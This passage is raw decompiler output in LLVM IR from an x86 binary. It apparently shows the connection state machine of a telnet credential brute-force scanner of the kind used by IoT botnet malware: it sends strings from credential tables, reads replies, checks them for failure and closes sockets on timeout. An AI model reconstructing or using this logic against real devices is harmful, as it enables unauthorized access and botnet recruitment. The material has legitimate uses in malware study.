  store i32 4, i32* %v2_804d6de, align 4
  %v0_804d6e6 = load i32, i32* @esp, align 4
  %v1_804d6e6 = add i32 %v0_804d6e6, 4
  %v2_804d6e6 = inttoptr i32 %v1_804d6e6 to i32*
  store i32 1, i32* %v2_804d6e6, align 4
  %v0_804d6ee = load i32, i32* %edx.global-to-local, align 4
  %v1_804d6ee = load i32, i32* @esp, align 4
  %v2_804d6ee = inttoptr i32 %v1_804d6ee to i32*
  store i32 %v0_804d6ee, i32* %v2_804d6ee, align 4
  %v0_804d6f1 = load i32, i32* %stack_var_-336, align 4
  %v1_804d6f1 = load i32, i32* %stack_var_-332, align 4
  %v2_804d6f1 = load i32, i32* %stack_var_-328, align 4
  %v4_804d6f1 = load i32, i32* %stack_var_-320, align 4
  %v5_804d6f1 = call i32 @getsockopt(i32 %v0_804d6f1, i32 %v1_804d6f1, i32 %v2_804d6f1, i32 10, i32 %v4_804d6f1)
  %v3_804d6f6 = load i32, i32* %stack_var_-336, align 4
  %v1_804d6fc = icmp eq i32 %v3_804d6f6, 0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d772 = load i32, i32* %v3_804d609, align 4
  store i32 %v4_804d772, i32* %eax.global-to-local, align 4
  %v0_804d775 = load i32, i32* @esp, align 4
  br i1 %v1_804d6fc, label %dec_label_pc_804d75c, label %dec_label_pc_804d700

dec_label_pc_804d700:                             ; preds = %dec_label_pc_804d69d
  %v2_804d719 = inttoptr i32 %v0_804d775 to i32*
  store i32 %v4_804d772, i32* %v2_804d719, align 4
  %v0_804d71c = load i32, i32* %stack_var_-336, align 4
  %v1_804d71c = call i32 @sclose(i32 %v0_804d71c)
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d752 = add i32 %v2_804d132, %v2_804d186
  %v4_804d752 = inttoptr i32 %v3_804d752 to i8*
  store i8 1, i8* %v4_804d752, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804d75c:                             ; preds = %dec_label_pc_804d69d
  %v1_804d775 = add i32 %v0_804d775, 8
  %v2_804d775 = inttoptr i32 %v1_804d775 to i32*
  store i32 0, i32* %v2_804d775, align 4
  %v0_804d77d = load i32, i32* @esp, align 4
  %v1_804d77d = add i32 %v0_804d77d, 4
  %v2_804d77d = inttoptr i32 %v1_804d77d to i32*
  store i32 3, i32* %v2_804d77d, align 4
  %v0_804d785 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d785 = load i32, i32* @esp, align 4
  %v2_804d785 = inttoptr i32 %v1_804d785 to i32*
  store i32 %v0_804d785, i32* %v2_804d785, align 4
  %v0_804d788 = load i32, i32* %stack_var_-336, align 4
  %v1_804d788 = load i32, i32* %stack_var_-332, align 4
  %v2_804d788 = load i32, i32* %stack_var_-328, align 4
  %v3_804d788 = call i32 @__libc_fcntl(i32 %v0_804d788, i32 %v1_804d788, i32 %v2_804d788)
  %v1_804d78f = and i32 %v3_804d788, -2049
  store i32 %v1_804d78f, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d7ab = load i32, i32* %v3_804d609, align 4
  store i32 %v4_804d7ab, i32* %eax.global-to-local, align 4
  %v1_804d7ae = load i32, i32* @esp, align 4
  %v2_804d7ae = add i32 %v1_804d7ae, 8
  %v3_804d7ae = inttoptr i32 %v2_804d7ae to i32*
  store i32 %v1_804d78f, i32* %v3_804d7ae, align 4
  %v0_804d7b2 = load i32, i32* @esp, align 4
  %v1_804d7b2 = add i32 %v0_804d7b2, 4
  %v2_804d7b2 = inttoptr i32 %v1_804d7b2 to i32*
  store i32 4, i32* %v2_804d7b2, align 4
  %v0_804d7ba = load i32, i32* %eax.global-to-local, align 4
  %v1_804d7ba = load i32, i32* @esp, align 4
  %v2_804d7ba = inttoptr i32 %v1_804d7ba to i32*
  store i32 %v0_804d7ba, i32* %v2_804d7ba, align 4
  %v0_804d7bd = load i32, i32* %stack_var_-336, align 4
  %v1_804d7bd = load i32, i32* %stack_var_-332, align 4
  %v2_804d7bd = load i32, i32* %stack_var_-328, align 4
  %v3_804d7bd = call i32 @__libc_fcntl(i32 %v0_804d7bd, i32 %v1_804d7bd, i32 %v2_804d7bd)
  store i32 0, i32* %v1_804d18d, align 4
  %v1_804d7fe = add i32 %v2_804d188, 20
  %v2_804d7fe = inttoptr i32 %v1_804d7fe to i16*
  store i16 0, i16* %v2_804d7fe, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  %v1_804d81c = add i32 %v2_804d188, 24
  store i32 %v1_804d81c, i32* %eax.global-to-local, align 4
  %v1_804d81f = inttoptr i32 %v1_804d81c to i32*
  %v2_804d81f = load i32, i32* %v1_804d81f, align 4
  store i32 %v2_804d81f, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804d828 = load i32, i32* @esp, align 4
  %v2_804d828 = add i32 %v1_804d828, 8
  %v3_804d828 = inttoptr i32 %v2_804d828 to i32*
  store i32 1024, i32* %v3_804d828, align 4
  %v0_804d82c = load i32, i32* @esp, align 4
  %v1_804d82c = add i32 %v0_804d82c, 4
  %v2_804d82c = inttoptr i32 %v1_804d82c to i32*
  store i32 0, i32* %v2_804d82c, align 4
  %v0_804d834 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d834 = load i32, i32* @esp, align 4
  %v2_804d834 = inttoptr i32 %v1_804d834 to i32*
  store i32 %v0_804d834, i32* %v2_804d834, align 4
  %v0_804d837 = load i32, i32* %stack_var_-336, align 4
  %v1_804d837 = load i32, i32* %stack_var_-332, align 4
  %v2_804d837 = load i32, i32* %stack_var_-328, align 4
  %v3_804d837 = inttoptr i32 %v0_804d837 to i8*
  %v4_804d837 = call i32 @__GI_memset(i8* %v3_804d837, i32 %v1_804d837, i32 %v2_804d837)
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804d85c:                             ; preds = %dec_label_pc_804d5da
  %v13_804d85c = icmp eq i32 %v5_804d68b, -1
  %v1_804d860 = icmp eq i1 %v13_804d85c, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804d860, label %dec_label_pc_804d8be, label %dec_label_pc_804d862

dec_label_pc_804d862:                             ; preds = %dec_label_pc_804d85c
  %v4_804d878 = load i32, i32* %v3_804d609, align 4
  store i32 %v4_804d878, i32* %eax.global-to-local, align 4
  %v1_804d87b = load i32, i32* @esp, align 4
  %v2_804d87b = inttoptr i32 %v1_804d87b to i32*
  store i32 %v4_804d878, i32* %v2_804d87b, align 4
  %v1_804d87e = call i32 @sclose(i32 %v5_804d68b)
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d8b4 = add i32 %v2_804d132, %v2_804d186
  %v4_804d8b4 = inttoptr i32 %v3_804d8b4 to i8*
  store i8 1, i8* %v4_804d8b4, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804d8be:                             ; preds = %dec_label_pc_804d85c
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  %v2_804d8d9 = load i32, i32* %v1_804d18d, align 4
  store i32 %v2_804d8d9, i32* %eax.global-to-local, align 4
  %v1_804d8db = add i32 %v2_804d8d9, 6
  store i32 %v1_804d8db, i32* @ebx, align 4
  %v0_804d8de = load i32, i32* @esp, align 4
  %v1_804d8de = inttoptr i32 %v0_804d8de to i32*
  store i32 0, i32* %v1_804d8de, align 4
  %v1_804d8e5 = inttoptr i32 %v5_804d68b to i32*
  %v2_804d8e5 = call i32 @__GI_time(i32* %v1_804d8e5)
  store i32 %v2_804d8e5, i32* %eax.global-to-local, align 4
  %v0_804d8ea = load i32, i32* @ebx, align 4
  %v7_804d8ea = icmp ult i32 %v0_804d8ea, %v2_804d8e5
  %v1_804d8ec = icmp eq i1 %v7_804d8ea, false
  br i1 %v1_804d8ec, label %dec_label_pc_804e324, label %dec_label_pc_804d8f2

dec_label_pc_804d8f2:                             ; preds = %dec_label_pc_804d8be
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v4_804d908 = load i32, i32* %v3_804d609, align 4
  store i32 %v4_804d908, i32* %eax.global-to-local, align 4
  %v1_804d90b = load i32, i32* @esp, align 4
  %v2_804d90b = inttoptr i32 %v1_804d90b to i32*
  store i32 %v4_804d908, i32* %v2_804d90b, align 4
  %v0_804d90e = load i32, i32* %stack_var_-336, align 4
  %v1_804d90e = call i32 @sclose(i32 %v0_804d90e)
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d944 = add i32 %v2_804d132, %v2_804d186
  %v4_804d944 = inttoptr i32 %v3_804d944 to i8*
  store i8 1, i8* %v4_804d944, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804d94e:                             ; preds = %dec_label_pc_804d1c0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  %v1_804d966 = add i32 %v2_804d188, 24
  store i32 %v1_804d966, i32* %eax.global-to-local, align 4
  %v1_804d969 = inttoptr i32 %v1_804d966 to i32*
  %v2_804d969 = load i32, i32* %v1_804d969, align 4
  store i32 %v2_804d969, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804d981 = inttoptr i32 %v2_804d188 to i32*
  %v4_804d981 = load i32, i32* %v3_804d981, align 4
  store i32 %v4_804d981, i32* %edx.global-to-local, align 4
  %v0_804d984 = load i32, i32* @esp, align 4
  %v1_804d984 = add i32 %v0_804d984, 16
  %v2_804d984 = inttoptr i32 %v1_804d984 to i32*
  store i32 134602852, i32* %v2_804d984, align 4
  %v0_804d98c = load i32, i32* @esp, align 4
  %v1_804d98c = add i32 %v0_804d98c, 12
  %v2_804d98c = inttoptr i32 %v1_804d98c to i32*
  store i32 1024, i32* %v2_804d98c, align 4
  %v0_804d994 = load i32, i32* @ebx, align 4
  %v1_804d994 = load i32, i32* @esp, align 4
  %v2_804d994 = add i32 %v1_804d994, 8
  %v3_804d994 = inttoptr i32 %v2_804d994 to i32*
  store i32 %v0_804d994, i32* %v3_804d994, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_804d99b = load i32, i32* @esp, align 4
  %v2_804d99b = add i32 %v1_804d99b, 4
  %v3_804d99b = inttoptr i32 %v2_804d99b to i32*
  store i32 10, i32* %v3_804d99b, align 4
  %v0_804d99f = load i32, i32* %edx.global-to-local, align 4
  %v1_804d99f = load i32, i32* @esp, align 4
  %v2_804d99f = inttoptr i32 %v1_804d99f to i32*
  store i32 %v0_804d99f, i32* %v2_804d99f, align 4
  %v1_804d9a2 = call i32 @read_until_response(i32 %v6_804d1d6)
  %v1_804d9a7 = icmp eq i32 %v1_804d9a2, 0
  store i32 %v1_804d178, i32* @edx, align 4
  store i32 %v2_804d188, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9a7, label %dec_label_pc_804da14, label %dec_label_pc_804d9ab

dec_label_pc_804d9ab:                             ; preds = %dec_label_pc_804d94e
  store i32 %v1_804d966, i32* %eax.global-to-local, align 4
  %v2_804d9c6 = load i32, i32* %v1_804d969, align 4
  store i32 %v2_804d9c6, i32* %eax.global-to-local, align 4
  %v1_804d9c8 = load i32, i32* @esp, align 4
  %v2_804d9c8 = inttoptr i32 %v1_804d9c8 to i32*
  store i32 %v2_804d9c6, i32* %v2_804d9c8, align 4
  %v0_804d9cb = call i32 @contains_fail()
  %v1_804d9d0 = icmp eq i32 %v0_804d9cb, 0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9d0, label %dec_label_pc_804d9f4, label %dec_label_pc_804d9d4

dec_label_pc_804d9d4:                             ; preds = %dec_label_pc_804d9ab
  store i8 0, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804d9f4:                             ; preds = %dec_label_pc_804d9ab
  store i8 3, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804da14:                             ; preds = %dec_label_pc_804d94e
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  %v2_804da2f = load i32, i32* %v1_804d18d, align 4
  store i32 %v2_804da2f, i32* %eax.global-to-local, align 4
  %v1_804da31 = add i32 %v2_804da2f, 6
  store i32 %v1_804da31, i32* @ebx, align 4
  %v0_804da34 = load i32, i32* @esp, align 4
  %v1_804da34 = inttoptr i32 %v0_804da34 to i32*
  store i32 0, i32* %v1_804da34, align 4
  %v0_804da3b = load i32, i32* %stack_var_-336, align 4
  %v1_804da3b = inttoptr i32 %v0_804da3b to i32*
  %v2_804da3b = call i32 @__GI_time(i32* %v1_804da3b)
  store i32 %v2_804da3b, i32* %eax.global-to-local, align 4
  %v0_804da40 = load i32, i32* @ebx, align 4
  %v7_804da40 = icmp ult i32 %v0_804da40, %v2_804da3b
  %v1_804da42 = icmp eq i1 %v7_804da40, false
  br i1 %v1_804da42, label %dec_label_pc_804e324, label %dec_label_pc_804da48

dec_label_pc_804da48:                             ; preds = %dec_label_pc_804da14
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804da79 = add i32 %v2_804d132, %v2_804d186
  %v4_804da79 = inttoptr i32 %v3_804da79 to i8*
  store i8 1, i8* %v4_804da79, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804da83:                             ; preds = %dec_label_pc_804d1c0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804da99 = add i32 %v2_804d34e, %v2_804d186
  %v4_804da99 = inttoptr i32 %v3_804da99 to i8*
  %v5_804da99 = load i8, i8* %v4_804da99, align 2
  %v6_804da99 = zext i8 %v5_804da99 to i32
  store i32 %v6_804da99, i32* %eax.global-to-local, align 4
  %v1_804daa1 = mul nuw nsw i32 %v6_804da99, 4
  %v2_804daa1 = add nuw nsw i32 %v1_804daa1, 134602824
  %v3_804daa1 = inttoptr i32 %v2_804daa1 to i32*
  %v4_804daa1 = load i32, i32* %v3_804daa1, align 4
  %v1_804dab3 = and i32 %v4_804daa1, -256
  store i32 %v1_804dab3, i32* %eax.global-to-local, align 4
  %v4_804dab6 = inttoptr i32 %v4_804daa1 to i8*
  store i32 %v4_804daa1, i32* @edi, align 4
  %v3_804dabc = call i32 @_strlen(i8* %v4_804dab6)
  store i32 %v3_804dabc, i32* @esi, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v5_804dadb = load i8, i8* %v4_804da99, align 2
  %v6_804dadb = zext i8 %v5_804dadb to i32
  store i32 %v6_804dadb, i32* %eax.global-to-local, align 4
  %v1_804dae3 = mul nuw nsw i32 %v6_804dadb, 4
  %v2_804dae3 = add nuw nsw i32 %v1_804dae3, 134602824
  %v3_804dae3 = inttoptr i32 %v2_804dae3 to i32*
  %v4_804dae3 = load i32, i32* %v3_804dae3, align 4
  store i32 %v4_804dae3, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804db00 = inttoptr i32 %v2_804d188 to i32*
  %v4_804db00 = load i32, i32* %v3_804db00, align 4
  store i32 %v4_804db00, i32* %eax.global-to-local, align 4
  %v0_804db03 = load i32, i32* @esp, align 4
  %v1_804db03 = add i32 %v0_804db03, 12
  %v2_804db03 = inttoptr i32 %v1_804db03 to i32*
  store i32 16384, i32* %v2_804db03, align 4
  %v0_804db0b = load i32, i32* @esi, align 4
  %v1_804db0b = load i32, i32* @esp, align 4
  %v2_804db0b = add i32 %v1_804db0b, 8
  %v3_804db0b = inttoptr i32 %v2_804db0b to i32*
  store i32 %v0_804db0b, i32* %v3_804db0b, align 4
  %v0_804db0f = load i32, i32* @ebx, align 4
  %v1_804db0f = load i32, i32* @esp, align 4
  %v2_804db0f = add i32 %v1_804db0f, 4
  %v3_804db0f = inttoptr i32 %v2_804db0f to i32*
  store i32 %v0_804db0f, i32* %v3_804db0f, align 4
  %v0_804db13 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db13 = load i32, i32* @esp, align 4
  %v2_804db13 = inttoptr i32 %v1_804db13 to i32*
  store i32 %v0_804db13, i32* %v2_804db13, align 4
  %v4_804db16 = call i32 @__libc_send(i32 %v4_804daa1, i32 %v2_804d0a9, i32 %v6_804d1d6, i32 ptrtoint (i32* @0 to i32))
  %v2_804db1b = icmp slt i32 %v4_804db16, 0
  %v1_804db1d = icmp eq i1 %v2_804db1b, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804db1d, label %dec_label_pc_804db5a, label %dec_label_pc_804db1f

dec_label_pc_804db1f:                             ; preds = %dec_label_pc_804da83
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804db50 = add i32 %v2_804d132, %v2_804d186
  %v4_804db50 = inttoptr i32 %v3_804db50 to i8*
  store i8 1, i8* %v4_804db50, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804db5a:                             ; preds = %dec_label_pc_804da83
  %v4_804db70 = load i32, i32* %v3_804db00, align 4
  store i32 %v4_804db70, i32* %eax.global-to-local, align 4
  %v0_804db73 = load i32, i32* @esp, align 4
  %v1_804db73 = add i32 %v0_804db73, 12
  %v2_804db73 = inttoptr i32 %v1_804db73 to i32*
  store i32 16384, i32* %v2_804db73, align 4
  %v0_804db7b = load i32, i32* @esp, align 4
  %v1_804db7b = add i32 %v0_804db7b, 8
  %v2_804db7b = inttoptr i32 %v1_804db7b to i32*
  store i32 2, i32* %v2_804db7b, align 4
  %v0_804db83 = load i32, i32* @esp, align 4
  %v1_804db83 = add i32 %v0_804db83, 4
  %v2_804db83 = inttoptr i32 %v1_804db83 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8059b29.248 to i32), i32* %v2_804db83, align 4
  %v0_804db8b = load i32, i32* %eax.global-to-local, align 4
  %v1_804db8b = load i32, i32* @esp, align 4
  %v2_804db8b = inttoptr i32 %v1_804db8b to i32*
  store i32 %v0_804db8b, i32* %v2_804db8b, align 4
  %v4_804db8e = call i32 @__libc_send(i32 %v4_804daa1, i32 %v2_804d0a9, i32 %v6_804d1d6, i32 ptrtoint (i32* @0 to i32))
  %v2_804db93 = icmp slt i32 %v4_804db8e, 0
  %v1_804db95 = icmp eq i1 %v2_804db93, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804db95, label %dec_label_pc_804dbd2, label %dec_label_pc_804db97

dec_label_pc_804db97:                             ; preds = %dec_label_pc_804db5a
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804dbc8 = add i32 %v2_804d132, %v2_804d186
  %v4_804dbc8 = inttoptr i32 %v3_804dbc8 to i8*
  store i8 1, i8* %v4_804dbc8, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804dbd2:                             ; preds = %dec_label_pc_804db5a
  store i8 4, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804dbf2:                             ; preds = %dec_label_pc_804d1c0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  %v1_804dc0a = add i32 %v2_804d188, 24
  store i32 %v1_804dc0a, i32* %eax.global-to-local, align 4
  %v1_804dc0d = inttoptr i32 %v1_804dc0a to i32*
  %v2_804dc0d = load i32, i32* %v1_804dc0d, align 4
  store i32 %v2_804dc0d, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804dc25 = inttoptr i32 %v2_804d188 to i32*
  %v4_804dc25 = load i32, i32* %v3_804dc25, align 4
  store i32 %v4_804dc25, i32* %edx.global-to-local, align 4
  %v0_804dc28 = load i32, i32* @esp, align 4
  %v1_804dc28 = add i32 %v0_804dc28, 16
  %v2_804dc28 = inttoptr i32 %v1_804dc28 to i32*
  store i32 ptrtoint (i32* @global_var_805e064 to i32), i32* %v2_804dc28, align 4
  %v0_804dc30 = load i32, i32* @esp, align 4
  %v1_804dc30 = add i32 %v0_804dc30, 12
  %v2_804dc30 = inttoptr i32 %v1_804dc30 to i32*
  store i32 1024, i32* %v2_804dc30, align 4
  %v0_804dc38 = load i32, i32* @ebx, align 4
  %v1_804dc38 = load i32, i32* @esp, align 4
  %v2_804dc38 = add i32 %v1_804dc38, 8
  %v3_804dc38 = inttoptr i32 %v2_804dc38 to i32*
  store i32 %v0_804dc38, i32* %v3_804dc38, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_804dc3f = load i32, i32* @esp, align 4
  %v2_804dc3f = add i32 %v1_804dc3f, 4
  %v3_804dc3f = inttoptr i32 %v2_804dc3f to i32*
  store i32 10, i32* %v3_804dc3f, align 4
  %v0_804dc43 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dc43 = load i32, i32* @esp, align 4
  %v2_804dc43 = inttoptr i32 %v1_804dc43 to i32*
  store i32 %v0_804dc43, i32* %v2_804dc43, align 4
  %v1_804dc46 = call i32 @read_until_response(i32 %v6_804d1d6)
  %v1_804dc4b = icmp eq i32 %v1_804dc46, 0
  store i32 %v1_804d178, i32* @edx, align 4
  store i32 %v2_804d188, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc4b, label %dec_label_pc_804dcb8, label %dec_label_pc_804dc4f

dec_label_pc_804dc4f:                             ; preds = %dec_label_pc_804dbf2
  store i32 %v1_804dc0a, i32* %eax.global-to-local, align 4
  %v2_804dc6a = load i32, i32* %v1_804dc0d, align 4
  store i32 %v2_804dc6a, i32* %eax.global-to-local, align 4
  %v1_804dc6c = load i32, i32* @esp, align 4
  %v2_804dc6c = inttoptr i32 %v1_804dc6c to i32*
  store i32 %v2_804dc6a, i32* %v2_804dc6c, align 4
  %v0_804dc6f = call i32 @contains_fail()
  %v1_804dc74 = icmp eq i32 %v0_804dc6f, 0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc74, label %dec_label_pc_804dc98, label %dec_label_pc_804dc78

dec_label_pc_804dc78:                             ; preds = %dec_label_pc_804dc4f
  store i8 0, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804dc98:                             ; preds = %dec_label_pc_804dc4f
  store i8 5, i8* %v4_804d1d6, align 4
  br label %dec_label_pc_804e324

dec_label_pc_804dcb8:                             ; preds = %dec_label_pc_804dbf2
  store i32 %v1_804d18a, i32* %eax.global-to-local, align 4
  %v2_804dcd3 = load i32, i32* %v1_804d18d, align 4
  store i32 %v2_804dcd3, i32* %eax.global-to-local, align 4
  %v1_804dcd5 = add i32 %v2_804dcd3, 6
  store i32 %v1_804dcd5, i32* @ebx, align 4
  %v0_804dcd8 = load i32, i32* @esp, align 4
  %v1_804dcd8 = inttoptr i32 %v0_804dcd8 to i32*
  store i32 0, i32* %v1_804dcd8, align 4
  %v1_804dcdf = inttoptr i32 %stack_var_-624.241 to i32*
  %v2_804dcdf = call i32 @__GI_time(i32* %v1_804dcdf)
  store i32 %v2_804dcdf, i32* %eax.global-to-local, align 4
  %v0_804dce4 = load i32, i32* @ebx, align 4
  %v7_804dce4 = icmp ult i32 %v0_804dce4, %v2_804dcdf
  %v1_804dce6 = icmp eq i1 %v7_804dce4, false
  br i1 %v1_804dce6, label %dec_label_pc_804e324, label %dec_label_pc_804dcec

dec_label_pc_804dcec:                             ; preds = %dec_label_pc_804dcb8
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804dd1d = add i32 %v2_804d132, %v2_804d186
  %v4_804dd1d = inttoptr i32 %v3_804dd1d to i8*
  store i8 1, i8* %v4_804dd1d, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804dd27:                             ; preds = %dec_label_pc_804d1c0
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804dd3d = add i32 %v2_804d307, %v2_804d186
  %v4_804dd3d = inttoptr i32 %v3_804dd3d to i8*
  %v5_804dd3d = load i8, i8* %v4_804dd3d, align 1
  %v6_804dd3d = zext i8 %v5_804dd3d to i32
  store i32 %v6_804dd3d, i32* %eax.global-to-local, align 4
  %v1_804dd45 = mul nuw nsw i32 %v6_804dd3d, 4
  %v2_804dd45 = add nuw nsw i32 %v1_804dd45, 134602836
  %v3_804dd45 = inttoptr i32 %v2_804dd45 to i32*
  %v4_804dd45 = load i32, i32* %v3_804dd45, align 4
  %v1_804dd57 = and i32 %v4_804dd45, -256
  store i32 %v1_804dd57, i32* %eax.global-to-local, align 4
  %v4_804dd5a = inttoptr i32 %v4_804dd45 to i8*
  store i32 %v4_804dd45, i32* @edi, align 4
  %v3_804dd60 = call i32 @_strlen(i8* %v4_804dd5a)
  store i32 %v3_804dd60, i32* @esi, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v5_804dd7f = load i8, i8* %v4_804dd3d, align 1
  %v6_804dd7f = zext i8 %v5_804dd7f to i32
  store i32 %v6_804dd7f, i32* %eax.global-to-local, align 4
  %v1_804dd87 = mul nuw nsw i32 %v6_804dd7f, 4
  %v2_804dd87 = add nuw nsw i32 %v1_804dd87, 134602836
  %v3_804dd87 = inttoptr i32 %v2_804dd87 to i32*
  %v4_804dd87 = load i32, i32* %v3_804dd87, align 4
  store i32 %v4_804dd87, i32* @ebx, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804dda4 = inttoptr i32 %v2_804d188 to i32*
  %v4_804dda4 = load i32, i32* %v3_804dda4, align 4
  store i32 %v4_804dda4, i32* %eax.global-to-local, align 4
  %v0_804dda7 = load i32, i32* @esp, align 4
  %v1_804dda7 = add i32 %v0_804dda7, 12
  %v2_804dda7 = inttoptr i32 %v1_804dda7 to i32*
  store i32 16384, i32* %v2_804dda7, align 4
  %v0_804ddaf = load i32, i32* @esi, align 4
  %v1_804ddaf = load i32, i32* @esp, align 4
  %v2_804ddaf = add i32 %v1_804ddaf, 8
  %v3_804ddaf = inttoptr i32 %v2_804ddaf to i32*
  store i32 %v0_804ddaf, i32* %v3_804ddaf, align 4
  %v0_804ddb3 = load i32, i32* @ebx, align 4
  %v1_804ddb3 = load i32, i32* @esp, align 4
  %v2_804ddb3 = add i32 %v1_804ddb3, 4
  %v3_804ddb3 = inttoptr i32 %v2_804ddb3 to i32*
  store i32 %v0_804ddb3, i32* %v3_804ddb3, align 4
  %v0_804ddb7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddb7 = load i32, i32* @esp, align 4
  %v2_804ddb7 = inttoptr i32 %v1_804ddb7 to i32*
  store i32 %v0_804ddb7, i32* %v2_804ddb7, align 4
  %v4_804ddba = call i32 @__libc_send(i32 %v4_804dd45, i32 %stack_var_-624.241, i32 %v2_804d0a9, i32 %v6_804d1d6)
  %v2_804ddbf = icmp slt i32 %v4_804ddba, 0
  %v1_804ddc1 = icmp eq i1 %v2_804ddbf, false
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  br i1 %v1_804ddc1, label %dec_label_pc_804ddfe, label %dec_label_pc_804ddc3

dec_label_pc_804ddc3:                             ; preds = %dec_label_pc_804dd27
  store i8 0, i8* %v4_804d1d6, align 4
  store i32 %v1_804d178, i32* %edx.global-to-local, align 4
  store i32 %v2_804d186, i32* %eax.global-to-local, align 4
  %v3_804ddf4 = add i32 %v2_804d132, %v2_804d186
  %v4_804ddf4 = inttoptr i32 %v3_804ddf4 to i8*
  store i8 1, i8* %v4_804ddf4, align 1
  br label %dec_label_pc_804e324

dec_label_pc_804ddfe:                             ; preds = %dec_label_pc_804dd27
  %v4_804de14 = load i32, i32* %v3_804dda4, align 4
  store i32 %v4_804de14, i32* %eax.global-to-local, align 4
  %v0_804de17 = load i32, i32* @esp, align 4
  %v1_804de17 = add i32 %v0_804de17, 12
  %v2_804de17 = inttoptr i32 %v1_804de17 to i32*
  store i32 16384, i32* %v2_804de17, align 4
  %v0_804de1f = load i32, i32* @esp, align 4
  %v1_804de1f = add i32 %v0_804de1f, 8
  %v2_804de1f = inttoptr i32 %v1_804de1f to i32*
  store i32 2, i32* %v2_804de1f, align 4
  %v0_804de27 = load i32, i32* @esp, align 4
  %v1_804de27 = add i32 %v0_804de27, 4
